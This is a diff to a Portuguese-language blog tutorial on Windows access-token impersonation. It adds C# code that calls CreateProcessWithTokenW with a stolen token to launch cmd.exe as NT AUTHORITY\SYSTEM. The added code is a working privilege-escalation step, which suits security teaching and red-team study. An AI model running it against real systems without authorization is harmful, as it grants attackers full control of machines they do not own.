@@ -191,6 +191,35 @@ public static extern bool CreateProcessWithTokenW(
 Note que estamos criando um novo processo do zero especificando o token de segurança no argumento `hToken`. Vale ressaltar que:
 
 - `LogonFlags`: enum que contém valores para o tipo de logon que será realizado quando o processo for aberto. Existem dois tipos: `LOGON_WITH_PROFILE⁴` e `LOGON_NETCREDENTIALS_ONLY⁵`. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).
-- `CreateProcessFlags`: enum que contém valores sobre como o processo será criado, como: `CREATE_NO_WINDOW` para não criar uma janela, `CREATE_PROTECTED_PROCESS` para criar um processo protegido, entre outros. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/procthread/process-creation-flags).
+- `CreateProcessFlags`: enum que contém valores de como o processo será criado, como: `CREATE_NO_WINDOW` para não criar janela, `CREATE_PROTECTED_PROCESS` para criar um processo protegido, entre outros. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/procthread/process-creation-flags).
 - `STARTUPINFO`: struct que contém valores sobre estações de janelas, área de trabalho, aparência da janela de um processo, entre outros. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa).
 - `PROCESS_INFORMATION`: struct que contém valores sobre informações do processo recém-criado. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).
+
+```csharp
+Impersonate.PInvokes.STARTUPINFO si = new Impersonate.PInvokes.STARTUPINFO();
+Impersonate.PInvokes.PROCESS_INFORMATION processInformation = new Impersonate.PInvokes.PROCESS_INFORMATION();
+
+bool result = Impersonate.PInvokes.CreateProcessWithTokenW(
+	phNewToken,
+	Impersonate.PInvokes.LogonFlags.LOGON_NETCREDENTIALS_ONLY,
+	@"C:\Windows\System32\cmd.exe",
+	null,
+	0,
+	IntPtr.Zero,
+	null,
+	ref si,
+	out processInformation
+);
+
+if (result == false)
+{
+	Console.WriteLine($"CreateProcessWithTokenW ERROR: {Marshal.GetLastWin32Error()}");
+	Environment.Exit(0);
+}
+
+Console.WriteLine("[+] (CreateProcessWithTokenW) Success!");
+```
+
+Feito isso, caso a execução da API seja um sucesso, um novo processo "cmd.exe" será criado com o nível de permissão que almejamos graças ao token de segurança. Neste caso, especificamos um processo que está rodando como `NT AUTHORITY\SYSTEM`.
+
+![Desktop View](https://blackmetal2000.github.io/assets/img/tokens/imagem3.png)
